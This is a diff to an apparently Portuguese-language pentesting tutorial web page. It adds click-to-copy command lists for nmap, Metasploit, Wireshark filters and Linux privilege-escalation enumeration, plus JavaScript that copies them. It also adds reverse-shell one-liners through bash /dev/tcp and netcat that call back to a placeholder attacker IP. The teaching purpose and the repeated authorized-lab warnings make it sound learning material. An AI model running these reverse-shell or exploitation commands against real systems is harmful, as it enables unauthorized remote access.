@@ -437,6 +437,29 @@ main { padding: 0 42px 70px; }
 .quiz-final .score { font-size:46px; font-weight:900; color:var(--cyan); margin:8px 0; }
 .quiz-final .msg { font-size:16px; color:#cdddec; margin-bottom:18px; }
 
+/* Comandos clicáveis (copiar + marcadores) */
+.cmd-list { display:flex; flex-direction:column; gap:8px; margin:12px 0; }
+code.cmd {
+  display:inline-block; cursor:pointer; position:relative;
+  background:#06090f; border:1px solid rgba(116,255,0,.4);
+  color:var(--green); padding:8px 12px; border-radius:8px;
+  font-family:"JetBrains Mono", Consolas, ui-monospace, monospace; font-size:13px;
+  word-break:break-word; transition:background .15s, border-color .15s;
+}
+.cmd-list code.cmd { display:block; }
+code.cmd::after { content:'📋'; font-size:11px; margin-left:8px; opacity:.55; }
+code.cmd:hover { background:rgba(116,255,0,.12); border-color:var(--green); }
+code.cmd.copied { background:rgba(116,255,0,.22); }
+code.cmd.copied::after { content:'✅'; }
+.cmd-hint {
+  display:block; margin:8px 0 4px;
+  background:rgba(116,255,0,.08); border:1px solid rgba(116,255,0,.3);
+  border-radius:10px; padding:10px 13px; font-size:12.5px; line-height:1.6; color:#e3ffd0;
+  animation:fadeIn .2s ease;
+}
+.cmd-hint b { color:var(--green); }
+.cmd-hint .ph { background:rgba(0,0,0,.45); border:1px solid rgba(116,255,0,.3); color:var(--yellow); padding:1px 6px; border-radius:5px; font-family:ui-monospace,monospace; font-size:12px; }
+
 /* Quiz */
 .quiz {
   max-width: 900px;
@@ -1017,6 +1040,13 @@ Service detection performed. Nmap done.</pre>
             <li><code>-p-</code> escaneia todas as 65535 portas. <code>-sC</code> roda scripts padrão.</li>
             <li><code>-T4</code> acelera o scan. <code>-sS</code> faz um scan "stealth" (SYN).</li>
           </ul>
+          <h4>Comandos para copiar (clique e edite o alvo)</h4>
+          <div class="cmd-list">
+            <code class="cmd">nmap -sV &lt;ALVO&gt;</code>
+            <code class="cmd">nmap -p- -T4 &lt;ALVO&gt;</code>
+            <code class="cmd">sudo nmap -O &lt;ALVO&gt;</code>
+            <code class="cmd">nmap -sV -sC -p- -T4 &lt;ALVO&gt;</code>
+          </div>
           <div class="callout danger"><b>Importante:</b> escanear redes/sistemas <b>sem autorização</b> pode ser crime. Treine no próprio <code>scanme.nmap.org</code> (liberado pelos autores) ou em laboratórios como TryHackMe/HTB.</div>
         </div>
       </details>
@@ -1045,6 +1075,15 @@ Service detection performed. Nmap done.</pre>
             <img src="img/metasploit.jpg" alt="Console do Metasploit (msfconsole) rodando no Kali Linux" loading="lazy">
             <figcaption>Tela real do <b>msfconsole</b> rodando no Kali Linux. Crédito: Arshane88, CC BY-SA 4.0, via Wikimedia Commons.</figcaption>
           </figure>
+          <h4>Comandos para copiar (clique e edite o que falta)</h4>
+          <div class="cmd-list">
+            <code class="cmd">search &lt;termo&gt;</code>
+            <code class="cmd">use &lt;modulo&gt;</code>
+            <code class="cmd">set RHOSTS &lt;IP_DO_ALVO&gt;</code>
+            <code class="cmd">set LHOST &lt;SEU_IP&gt;</code>
+            <code class="cmd">set PAYLOAD &lt;payload&gt;</code>
+            <code class="cmd">exploit</code>
+          </div>
           <div class="callout tip"><b>Para treinar:</b> a máquina virtual <b>Metasploitable</b> é propositalmente vulnerável e feita para você praticar de forma legal e segura no seu próprio laboratório.</div>
         </div>
       </details>
@@ -1076,8 +1115,15 @@ Service detection performed. Nmap done.</pre>
           <ul class="bullets">
             <li>Conversas completas (com <b>"Follow TCP Stream"</b> você remonta a sessão inteira).</li>
             <li>Em <b>HTTP</b> (sem TLS): senhas e dados em <b>texto claro</b> — o motivo de o HTTPS existir.</li>
-            <li><b>Filtros</b> poderosos: <code>http</code>, <code>ip.addr == 10.0.0.5</code>, <code>tcp.port == 443</code>.</li>
+            <li><b>Filtros</b> poderosos para isolar o que importa (veja abaixo).</li>
           </ul>
+          <h4>Filtros para copiar (cole na barra do Wireshark)</h4>
+          <div class="cmd-list">
+            <code class="cmd">http</code>
+            <code class="cmd">ip.addr == &lt;IP&gt;</code>
+            <code class="cmd">tcp.port == 443</code>
+            <code class="cmd">http.request.method == "POST"</code>
+          </div>
           <div class="callout danger"><b>A grande lição:</b> ao abrir o Wireshark numa rede e ver senhas de sites HTTP voando em texto puro, você entende <em>visceralmente</em> por que nunca se deve logar em sites sem cadeado, ainda mais em Wi-Fi público.</div>
         </div>
       </details>
@@ -2350,6 +2396,13 @@ SELECT * FROM users WHERE user='joao' AND pass='<span class="p">' OR '1'='1</spa
             <li><b>Credenciais esquecidas</b> em arquivos, scripts e variáveis de ambiente.</li>
             <li>Tarefas agendadas (cron) executando algo que você pode editar.</li>
           </ul>
+          <h4>Comandos para copiar (enumeração — lab autorizado)</h4>
+          <div class="cmd-list">
+            <code class="cmd">sudo -l</code>
+            <code class="cmd">find / -perm -4000 2>/dev/null</code>
+            <code class="cmd">uname -a</code>
+            <code class="cmd">./linpeas.sh</code>
+          </div>
           <div class="callout tip"><b>Defesa:</b> princípio do <b>menor privilégio</b> (ninguém é admin sem precisar), patches em dia e revisão de configurações. Ferramentas como <code>linPEAS</code>/<code>winPEAS</code> automatizam a busca por esses caminhos (úteis para o pentester e para o defensor auditar).</div>
         </div>
       </details>
@@ -2390,6 +2443,12 @@ SELECT * FROM users WHERE user='joao' AND pass='<span class="p">' OR '1'='1</spa
             <li><b>Bind shell:</b> a vítima abre uma porta e espera. Firewalls costumam bloquear conexões de entrada → falha fácil.</li>
             <li><b>Reverse shell:</b> a <em>vítima</em> conecta de volta ao atacante. Como tráfego de saída quase sempre é permitido, fura o firewall. Por isso é o preferido.</li>
           </ul>
+          <h4>Comandos para copiar (lab autorizado)</h4>
+          <div class="cmd-list">
+            <code class="cmd">nc -lvnp 4444</code>
+            <code class="cmd">bash -i &gt;&amp; /dev/tcp/&lt;SEU_IP&gt;/4444 0&gt;&amp;1</code>
+            <code class="cmd">nc &lt;SEU_IP&gt; 4444 -e /bin/bash</code>
+          </div>
           <div class="callout danger"><b>Lição defensiva:</b> monitore o tráfego de <em>saída</em> também, não só o de entrada. Conexões estranhas saindo da sua rede são um forte indicador de comprometimento (IOC).</div>
         </div>
       </details>
@@ -3174,6 +3233,74 @@ SELECT * FROM users WHERE user='joao' AND pass='<span class="p">' OR '1'='1</spa
     if(!confirm('Apagar todas as anotações do dossiê?')) return;
     fields.forEach(function(id){ if(els[id]) els[id].value = ''; });
     data = {}; try{ localStorage.removeItem(KEY); }catch(e){}
+  });
+})();
+
+// ===== Comandos clicáveis: copiar + marcadores + dica ao clicar =====
+(function(){
+  var PH = {
+    '<IP_DO_ALVO>':'IP do alvo (autorizado)',
+    '<IP_OU_DOMINIO>':'IP ou domínio do alvo (autorizado)',
+    '<ALVO>':'IP ou domínio do alvo (autorizado)',
+    '<SEU_IP>':'o IP da SUA máquina (atacante/listener)',
+    '<IP>':'o endereço IP em questão',
+    '<PORTA>':'a porta (ex: 4444)',
+    '<termo>':'o que buscar (ex: vsftpd, eternalblue)',
+    '<modulo>':'o módulo escolhido (copie do resultado do search)',
+    '<payload>':'o payload (ex: linux/x64/meterpreter/reverse_tcp)',
+    '<wordlist>':'caminho da lista de senhas (ex: /usr/share/wordlists/rockyou.txt)',
+    '<arquivo_hash>':'arquivo local com os hashes',
+    '<FAIXA_DE_REDE>':'sua faixa de rede (ex: 192.168.0.0/24)'
+  };
+
+  function copyText(txt, ok){
+    if(navigator.clipboard && navigator.clipboard.writeText){ navigator.clipboard.writeText(txt).then(ok, function(){}); }
+    else { var t=document.createElement('textarea'); t.value=txt; document.body.appendChild(t); t.select(); try{document.execCommand('copy');}catch(e){} document.body.removeChild(t); ok(); }
+  }
+
+  function showHint(after, cmd){
+    var prev = after.parentNode.querySelector(':scope > .cmd-hint');
+    if(prev) prev.parentNode.removeChild(prev);
+    var found = [];
+    for(var k in PH){ if(cmd.indexOf(k) >= 0) found.push(k); }
+    var h = document.createElement('div'); h.className = 'cmd-hint';
+    if(found.length){
+      var html = '✅ <b>Copiado!</b> Cole no Kali e edite antes de rodar:';
+      found.forEach(function(k){ html += '<br><span class="ph">' + k.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span> = ' + PH[k]; });
+      h.innerHTML = html;
+    } else {
+      h.innerHTML = '✅ <b>Copiado!</b> Comando completo — é só colar e rodar (em alvo autorizado).';
+    }
+    after.insertAdjacentElement('afterend', h);
+    clearTimeout(after._t);
+    after._t = setTimeout(function(){ if(h.parentNode) h.parentNode.removeChild(h); }, 7000);
+  }
+
+  document.querySelectorAll('code.cmd').forEach(function(c){
+    c.setAttribute('title', 'Clique para copiar');
+    c.setAttribute('role', 'button');
+    c.addEventListener('click', function(){
+      var cmd = c.textContent;
+      copyText(cmd, function(){
+        c.classList.add('copied');
+        showHint(c, cmd);
+        setTimeout(function(){ c.classList.remove('copied'); }, 1800);
+      });
+    });
+  });
+
+  // botão de copiar nos mockups de terminal que têm linha de comando ($)
+  document.querySelectorAll('.mock-term').forEach(function(m){
+    var pre = m.querySelector('pre'); var bar = m.querySelector('.bar');
+    if(!pre || !bar) return;
+    var cmds = pre.textContent.split('\n').map(function(l){ return l.trim(); }).filter(function(l){ return /^\$\s+\S/.test(l); }).map(function(l){ return l.replace(/^\$\s+/, ''); });
+    if(!cmds.length) return;
+    var cmd = cmds.join('\n').replace(/scanme\.nmap\.org/g, '<ALVO>');
+    var btn = document.createElement('button'); btn.type = 'button';
+    btn.style.cssText = 'margin-left:auto;background:rgba(116,255,0,.14);border:1px solid rgba(116,255,0,.4);color:var(--green);font-weight:800;font-size:11px;padding:4px 9px;border-radius:7px;cursor:pointer;';
+    btn.textContent = '📋 copiar';
+    btn.addEventListener('click', function(){ copyText(cmd, function(){ btn.textContent='✅ copiado'; setTimeout(function(){ btn.textContent='📋 copiar'; }, 1500); }); });
+    bar.appendChild(btn);
   });
 })();
 </script>
